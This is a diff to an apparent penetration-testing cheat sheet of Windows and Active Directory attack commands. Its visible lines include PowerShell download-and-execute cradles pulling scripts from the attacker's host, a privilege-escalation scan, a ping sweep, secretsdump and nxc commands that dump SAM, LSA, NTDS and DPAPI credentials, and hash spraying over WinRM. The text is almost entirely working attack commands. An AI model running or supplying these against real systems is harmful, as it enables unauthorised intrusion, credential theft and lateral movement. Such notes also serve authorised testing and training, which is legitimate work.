@@ -1710,6 +1710,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/whoami')
 +---------- Full Privesc Scan ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 
++---------- Ping Sweep /24 ----------+
+//$MYIP/$/ping.bat 192.168.210.X
+
 +---------- Pre Windows 2000 ----------+
 cat computers | cut -d '$' -f1 > PRE2k
 nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
@@ -1718,8 +1721,6 @@ nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
-
-+---------- Crack Hashes ----------+
 
 +---------- Spray Hashes ----------+
 nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
